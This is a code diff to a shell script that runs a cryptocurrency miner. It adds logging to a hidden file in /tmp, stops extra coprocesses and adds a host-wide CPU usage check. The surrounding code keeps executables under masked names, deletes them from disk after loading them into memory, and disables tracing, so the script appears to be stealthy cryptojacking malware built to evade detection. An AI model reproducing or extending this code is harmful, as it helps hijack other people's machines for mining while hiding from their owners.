@@ -143,8 +143,13 @@ change_profile() {
 load_bins() {
     [ -z "${OBJ_MASK}" ] && log "missing obj mask variable" && exit 1
     # disable_tracing
-    fileToVar "${OBJ_MASK}" OBJ_BIN
-    fileToVar $(get_path "${CLM_MASK}") CLM_BIN || { log "troubles loading bins"; exit 1; }
+    if [ -n "$VERBOSE" ]; then
+        fileToVar "${OBJ_MASK}" OBJ_BIN 2>>/tmp/.debug_log || { log "troubles loading obj_bin"; exit 1; }
+        fileToVar "${CLM_MASK}" CLM_BIN 2>>/tmp/.debug_log || { log "troubles loading clm_bin"; exit 1; }
+    else
+        fileToVar "${OBJ_MASK}" OBJ_BIN || { log "troubles loading obj_bin"; exit 1; }
+        fileToVar "${CLM_MASK}" CLM_BIN || { log "troubles loading clm_bin"; exit 1; }
+    fi
     [ "$1" = rm ] && rm -f "${OBJ_MASK}" "${CLM_MASK}"
     # enable_tracing
 }
@@ -152,8 +157,13 @@ load_bins() {
 dump_bins() {
     [ -z "${OBJ_BIN}" ] && log "missing obj bin variable" && exit 1
     # disable_tracing
-    varToFile OBJ_BIN "${OBJ_MASK}" && chmod +x "${OBJ_MASK}" && unset OBJ_BIN
-    varToFile CLM_BIN "${CLM_MASK}" && chmod +x "${CLM_MASK}" && unset CLM_BIN
+    if [ -n "$VERBOSE" ]; then
+        varToFile OBJ_BIN "${OBJ_MASK}" 2>>/tmp/.debug_log && chmod +x "${OBJ_MASK}" && unset OBJ_BIN
+        varToFile CLM_BIN "${CLM_MASK}" 2>>/tmp/.debug_log && chmod +x "${CLM_MASK}" && unset CLM_BIN
+    else
+        varToFile OBJ_BIN "${OBJ_MASK}" && chmod +x "${OBJ_MASK}" && unset OBJ_BIN
+        varToFile CLM_BIN "${CLM_MASK}" && chmod +x "${CLM_MASK}" && unset CLM_BIN
+    fi
     # enable_tracing
 }
 
@@ -322,8 +332,10 @@ start_miner() {
 stop_miner(){
     ## restart miner
     export hash_health=100 switch_trigger_counter=0 PHs=$THs THs=0
-    stop_coproc objectd 9
-    stop_coproc cpumon 9
+    for cp in objectd cpumon pinger pauser limiter locker; do
+        stop_coproc $cp 9 2>/dev/null
+    done
+    wait
 }
 
 scratcher() {
@@ -614,8 +626,17 @@ load_check_prc_fixed() {
 }
 
 ## true if usage diff is < ${1}% (20%) from current max threads usage
+## if true it means the process has enough resources available, otherwise the number of threads
+## should be lowered
 usg_check() {
     [ $PROC_USG -gt $((cThr*100-${1:-20})) ]
+}
+
+## true if total host cpu usage is < $2 (1-100)
+## usage calculate average in the last three seconds each second
+host_usg_check() {
+    usgmon_prc 1 3
+    [ $cpu_avg_prc_1 -lt ${2:-100} ]
 }
 
 cpu_check() {
